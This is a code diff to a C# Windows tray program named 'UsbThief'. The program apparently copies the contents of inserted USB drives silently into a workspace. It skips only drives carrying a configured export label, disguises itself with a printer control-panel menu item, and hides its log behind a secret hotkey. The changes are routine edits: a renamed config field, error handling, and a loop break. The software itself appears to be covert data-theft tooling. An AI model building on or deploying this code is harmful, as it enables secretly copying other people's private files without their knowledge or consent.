@@ -56,7 +56,7 @@ namespace UsbThief
             public int sizeLim;
             public int delay;
             public string passwd;
-            public string volLabel;
+            public string exportVol;
             public string exportPath;
         }
         public struct UsbDevice
@@ -83,15 +83,6 @@ namespace UsbThief
             notifyIcon1.ContextMenuStrip.Items[2].Click += Item2_Click;
             try
             {
-                logger.Info("正在初始化");
-                Process.Start(Application.StartupPath + "\\fileassistant.exe", "-init");
-            }
-            catch (Exception e)
-            {
-                logger.Error("初始化失败：\n" + e);
-            }
-            try
-            {
                 HotkeyManager.Current.AddOrReplace("ShowLogForm", Keys.Shift | Keys.Control | Keys.Alt | Keys.L, ShowLogForm);
             }
             catch (Exception e)
@@ -116,6 +107,7 @@ namespace UsbThief
                 if (drive.Name == str)
                 {
                     freeSpace = drive.TotalFreeSpace / (1024 * 1024);
+                    break;
                 }
             }
             if (freeSpace <= 200)
@@ -209,8 +201,15 @@ namespace UsbThief
         }
         private void Item0_Click(object sender, EventArgs e)
         {
-            Process.Start("control", "printers");
-            logger.Info("一本正经地打开控制面板，原来真有人会按这个键");
+            try
+            {
+                Process.Start("control", "printers");
+                logger.Info("一本正经地打开控制面板，原来真有人会按这个键");
+            }
+            catch (Exception ex)
+            {
+                logger.Error("无法打开控制面板：\n" + ex);
+            }
         }
         private void Item2_Click(object sender, EventArgs e)
         {
@@ -287,7 +286,7 @@ namespace UsbThief
                                             notifyIcon1.ContextMenuStrip.Items[3].Text = " - U 盘 (" + currentDevice.name.Replace("\\", "") + ")";
                                         }
                                         notifyIcon1.Visible = true;
-                                        if (drive.VolumeLabel != conf.volLabel)
+                                        if (drive.VolumeLabel != conf.exportVol)
                                         {
                                             string[] para = { currentDevice.ser, currentDevice.name, workspace + currentDevice.ser };
                                             if (conf.delay > 0 && conf.delay <= 500)
